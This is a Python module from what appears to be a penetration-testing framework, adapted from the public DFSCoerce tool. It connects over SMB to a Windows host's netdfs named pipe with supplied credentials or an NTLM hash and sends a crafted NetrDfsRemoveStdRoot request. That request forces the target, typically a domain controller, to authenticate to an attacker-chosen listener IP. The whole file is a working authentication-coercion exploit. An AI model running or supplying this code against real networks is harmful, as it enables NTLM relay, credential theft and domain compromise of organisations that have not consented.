import sys
import traceback
from ctypes import *
import socket
import struct
import logging

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin

# source: https://github.com/Wh04m1001/DFSCoerce/blob/main/dfscoerce.py

class Module:
    name = 'DFSCoerce'
    description = 'Generate an auth with DFSCoerce'

    def run(self, target, args, creds, timeout):
        if len(args) != 1:
            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'DFSCoerce module requires 1 arg: -m dfscoerce <listener_ip>'})
            return

        domain = creds['domain'] if 'domain' in creds else None
        user = creds['username'] if 'username' in creds else None
        password = creds['password'] if 'password' in creds else None
        ntlm_hash = creds['hash'] if 'hash' in creds else ''
        do_kerberos = creds['kerberos'] if 'kerberos' in creds else False
        dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None
        listener_ip = args[0]

        check(target['hostname'], target['port'], listener_ip, domain, user, password, ntlm_hash, do_kerberos, dc_ip, timeout)

def check(ip, port, listener_ip, domain, username, password, ntlm_hash, do_kerberos, dc_ip, timeout):

    pipe = 'lsarpc'
    if len(ntlm_hash) != 0:
        lmhash, nthash = ntlm_hash.split(':')
    else:
        lmhash = ''
        nthash = ''

    trigger = TriggerAuth()

    dce = trigger.connect(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=ip, doKerberos=do_kerberos, dcHost=dc_ip, targetIp=ip)

    if type(dce) == str:
        Output.error({'target': 'smb://%s:%d' % (ip, port), 'message': '[DFSCoerce] Error: %s' % dce})
    else:
        Output.highlight({'target': 'smb://%s:%d' % (ip, port), 'message': '[DFSCoerce] successfully bound'})

        trigger.NetrDfsRemoveStdRoot(dce, listener_ip)
        dce.disconnect()

################################################################################
# STRUCTURES
################################################################################
class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'DFSNM SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'DFSNM SessionError: unknown error code: 0x%x' % self.error_code


class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('ApiFlags', DWORD),
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )
class NetrDfsAddRoot(NDRCALL):
    opnum = 12
    structure = (
         ('ServerName',WSTR),
         ('RootShare',WSTR),
         ('Comment',WSTR),
         ('ApiFlags',DWORD),
     )
class NetrDfsAddRootResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )

class TriggerAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp):
        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netdfs]' % target)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)
        dce = rpctransport.get_dce_rpc()
        #print("[-] Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
        try:
            dce.connect()
        except Exception as e:
            #print("Something went wrong, check error status => %s" % str(e))
            traceback.print_exc()
            return "Something went wrong, check error status => %s" % str(e)

        try:
            dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
        except Exception as e:
            #print("Something went wrong, check error status => %s" % str(e))
            traceback.print_exc()
            return "Something went wrong, check error status => %s" % str(e)
        #print("[+] Successfully bound!")
        return dce

    def NetrDfsRemoveStdRoot(self, dce, listener):
        #print("[-] Sending NetrDfsRemoveStdRoot!")
        try:
            request = NetrDfsRemoveStdRoot()
            request['ServerName'] = '%s\x00' % listener
            request['RootShare'] = 'test\x00'
            request['ApiFlags'] = 1
            #request.dump()
            resp = dce.request(request)

        except  Exception as e:
            #print(e)
            pass
